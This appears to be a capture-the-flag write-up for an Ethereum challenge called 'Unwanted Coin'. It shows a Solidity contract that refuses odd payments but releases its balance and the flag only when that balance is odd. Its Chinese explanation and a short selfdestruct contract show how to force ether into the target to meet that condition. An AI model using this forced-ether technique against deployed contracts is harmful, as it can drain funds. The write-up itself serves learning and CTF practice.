# Unwanted Coin

```solidity

pragma solidity >=0.6.1;

contract Modcoin {

    mapping(uint256 => bool) public is_successful;

    function recvpay() public payable {

        require(((msg.value / 0.001 ether ) % 2 == 0 && ((msg.value % 0.001 ether) == 0)), "Not Accepting These Coins.");

    }

    function getflag(uint256 target) public {

        require((address(this).balance / 0.001 ether ) % 2 == 1,"Not Wanted value");

        require(msg.sender.send(address(this).balance));

        is_successful[target] = true;

    }

    fallback () external payable {

        require(((msg.value / 0.001 ether ) % 2 == 0 && ((msg.value % 0.001 ether) == 0)), "Not Accepting These Coins.");

    }

}

```

原合约中两个支付函数 `recvpay()` 和 `fallback()` 都只允许接受偶数倍0.001 ether的付款，而合约的getflag函数则要求奇数倍 0.001 ether 的合约余额才可以执行（并清空合约余额），这时就需要绕过限制向合约地址发送ether，而合约自毁或挖矿产生的ether是无法拒绝的，可以通过以下自毁合约达到条件。

```solidity

contract Payassist {

    function destroy_pay(address payable addr) public payable {

        selfdestruct(addr);

    }

}```
